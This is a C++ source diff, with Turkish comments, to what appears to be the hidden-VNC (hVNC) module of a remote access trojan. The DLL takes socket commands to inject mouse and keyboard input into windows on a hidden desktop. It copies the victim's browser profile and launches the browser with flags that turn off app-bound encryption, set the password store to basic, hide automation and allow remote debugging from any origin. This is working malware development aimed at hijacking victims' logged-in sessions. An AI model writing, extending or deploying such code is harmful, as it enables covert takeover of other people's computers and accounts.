@@ -690,7 +690,7 @@ static void capture_loop() {
             windows.clear();
             HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
             while (hwnd) {
-                if (IsWindowVisible(hwnd)) windows.push_back(hwnd);
+                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) windows.push_back(hwnd);
                 hwnd = GetWindow(hwnd, GW_HWNDNEXT);
             }
             reverse(windows.begin(), windows.end());
@@ -814,77 +814,14 @@ static WPARAM mouse_wparam_for_button(int btn, bool down) {
     return MK_LBUTTON;
 }
 
-static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
-    HWND current = hwnd;
-    HWND best = hwnd;
+static void activate_target_window(HWND hwnd) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+    if (!hRoot) hRoot = hwnd;
 
-    while (current && IsWindow(current)) {
-        best = current;
-        POINT clientPt = screenPt;
-        if (!ScreenToClient(current, &clientPt)) break;
-
-        HWND child = ChildWindowFromPoint(current, clientPt);
-        if (!child || child == current) {
-            child = ChildWindowFromPointEx(current, clientPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
-        }
-        if (!child || child == current || !IsWindow(child)) break;
-
-        RECT childRect;
-        if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
-        current = child;
-    }
-
-    return best;
-}
-
-static HWND target_window_from_screen_point(POINT screenPt) {
-    HWND hwnd = WindowFromPoint(screenPt);
-    if (!hwnd || !IsWindow(hwnd)) return NULL;
-    return resolve_child_window_from_point(hwnd, screenPt);
-}
-
-static bool post_mouse_to_window(HWND hwnd, POINT screenPt, UINT msg, WPARAM wParam) {
-    if (!hwnd || !IsWindow(hwnd)) return false;
-
-    POINT clientPt = screenPt;
-    if (!ScreenToClient(hwnd, &clientPt)) return false;
-
-    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
-    PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
-    return PostMessageW(hwnd, msg, wParam, lParam) != FALSE;
-}
-
-static void activate_target_window(HWND hTarget, UINT mouseMsg, LRESULT hitTest) {
-    if (!hTarget || !IsWindow(hTarget)) return;
-
-    HWND hRoot = GetAncestor(hTarget, GA_ROOT);
-    if (!hRoot || !IsWindow(hRoot)) hRoot = hTarget;
     g_hLastWindow = hRoot;
-
-    HWND hFore = GetForegroundWindow();
-    if (hFore != hRoot) {
-        DWORD foreThreadId = hFore ? GetWindowThreadProcessId(hFore, NULL) : 0;
-        DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
-        DWORD currentThreadId = GetCurrentThreadId();
-
-        if (foreThreadId && foreThreadId != targetThreadId) {
-            AttachThreadInput(targetThreadId, foreThreadId, TRUE);
-            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
-            AllowSetForegroundWindow(ASFW_ANY);
-            SetForegroundWindow(hRoot);
-            SetActiveWindow(hRoot);
-            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-            AttachThreadInput(targetThreadId, foreThreadId, FALSE);
-        } else {
-            SetForegroundWindow(hRoot);
-            SetActiveWindow(hRoot);
-        }
-    }
-
-    PostMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(hitTest, mouseMsg));
-    PostMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
-    SetFocus(hTarget);
-    g_hCurrentFocus = hTarget;
+    SetForegroundWindow(hRoot);
+    SetFocus(hRoot);
 }
 
 // -----------------------------------------------------------------------
@@ -929,7 +866,7 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = target_window_from_screen_point(g_lastMousePos);
+            HWND hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
@@ -938,8 +875,7 @@ static void input_loop() {
             } else if (action == "hvnc_keyup") {
                 PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
-                // Doğrudan WM_CHAR post et
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);  // lParam genelde 1 (repeat count)
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
             g_forceFullFrame = true;
             continue;
@@ -986,14 +922,12 @@ static void input_loop() {
                     SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h,
                                  SWP_NOZORDER | SWP_NOACTIVATE);
                 }
-
             } else {
                 HWND hwnd = WindowFromPoint(screenPt);
                 if (hwnd) {
                     LRESULT ht = HTCLIENT;
                     if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                           SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
-                        // Provide cursor feedback
                         SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
                                           SMTO_ABORTIFHUNG, 200, NULL);
                     }
@@ -1004,95 +938,56 @@ static void input_loop() {
 
         if (action == "hvnc_mousedown") {
             g_forceFullFrame = true;
-            int  btn  = cmd.value("button", 0);
+            int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
+
             HWND hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
+            if (hwnd) {
+                LRESULT ht = HTCLIENT;
+                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
-            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
-            g_hLastWindow = hRoot;
+                if (ht != HTCLIENT && btn == 0) {
+                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                    if (hRoot) {
+                        if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
+                        else if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
+                        else if (ht == HTMAXBUTTON) {
+                            WINDOWPLACEMENT wp = { sizeof(wp) };
+                            GetWindowPlacement(hRoot, &wp);
+                            if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
+                            else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
+                            continue;
+                        }
 
-            LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-
-            UINT mouseMsg = mouse_message_for_button(btn, true);
-
-            SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
-
-            if (ht != HTCLIENT) {
-                if (btn == 0) {
-                    if (ht == HTCLOSE) {
-                        PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0);
-                        continue;
-                    } else if (ht == HTMINBUTTON) {
-                        PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0);
-                        continue;
-                    } else if (ht == HTMAXBUTTON) {
-                        WINDOWPLACEMENT wp = { sizeof(wp) };
-                        GetWindowPlacement(hRoot, &wp);
-                        if (wp.showCmd == SW_SHOWMAXIMIZED)
-                            PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
-                        else
-                            PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
-                        continue;
+                        if (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM ||
+                            ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT) {
+                            g_dragging = true;
+                            g_dragHwnd = hRoot;
+                            g_dragStartPt = screenPt;
+                            g_dragHitTest = ht;
+                            GetWindowRect(hRoot, &g_dragStartRect);
+                        }
                     }
                 }
-
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-
-                if (btn == 0 && (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT ||
-                                 ht == HTTOP || ht == HTBOTTOM || ht == HTTOPLEFT ||
-                                 ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT)) {
-                    g_dragging = true;
-                    g_dragHwnd = hRoot;
-                    g_dragStartPt = screenPt;
-                    g_dragHitTest = ht;
-                    GetWindowRect(hRoot, &g_dragStartRect);
-                }
-            } else {
-                HWND hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
-                activate_target_window(hTarget, mouseMsg, ht);
-                g_hCurrentFocus = hTarget;
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
-                g_mouseDownTarget[btn] = hTarget;
-                post_mouse_to_window(hTarget, screenPt, mouseMsg, mouse_wparam_for_button(btn, true));
+                activate_target_window(hwnd);
             }
+
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
             continue;
         }
 
         if (action == "hvnc_mouseup") {
             g_forceFullFrame = true;
-            int  btn = cmd.value("button", 0);
+            int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
+
             if (btn == 0 && g_dragging) {
-                g_dragging  = false;
-                g_dragHwnd  = NULL;
+                g_dragging = false;
+                g_dragHwnd = NULL;
             }
 
-            HWND hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
-
-            LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-
-            if (ht != HTCLIENT) {
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
-            } else {
-                HWND hTarget = g_mouseDownTarget[btn];
-                if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
-
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
-                post_mouse_to_window(hTarget, screenPt, mouse_message_for_button(btn, false), mouse_wparam_for_button(btn, false));
-                g_mouseDownTarget[btn] = NULL;
-            }
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
             continue;
         }
 
@@ -1100,29 +995,14 @@ static void input_loop() {
             g_forceFullFrame = true;
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
+
             HWND hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
+            if (hwnd) activate_target_window(hwnd);
 
-            LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-
-            if (ht == HTCLIENT) {
-                HWND hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
-                activate_target_window(hTarget, mouse_message_for_button(btn, true, btn == 0), ht);
-
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
-                UINT downMsg = mouse_message_for_button(btn, true);
-                UINT upMsg = mouse_message_for_button(btn, false);
-                UINT dblMsg = mouse_message_for_button(btn, true, btn == 0);
-                post_mouse_to_window(hTarget, screenPt, downMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
-                post_mouse_to_window(hTarget, screenPt, dblMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
-            }
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
             continue;
         }
     }
@@ -1316,7 +1196,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     profilePath += L"_Profile";
 
                     // Mevcut kopya varsa temizle
-                    fs::remove_all(profilePath);
+                    try {
+                        if (fs::exists(profilePath)) fs::remove_all(profilePath);
+                    } catch (...) {}
 
                     send_status("Profiller kopyalanıyor...");
                     if (!copy_recursive(fs::path(sourceUserData), fs::path(profilePath))) {
@@ -1361,7 +1243,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
                                    L" --force-cpu-draw"
-                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile"
+                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
                                    L" --password-store=basic"
                                    L" --disable-encryption-win"
                                    L" --restore-last-session"
@@ -1370,6 +1252,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-notifications"
                                    L" --disable-component-update"
                                    L" --disable-blink-features=AutomationControlled"
+                                   L" --disable-backgrounding-occluded-windows"
+                                   L" --disable-renderer-backgrounding"
+                                   L" --remote-allow-origins=*"
                                    L" --lang=en-US";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
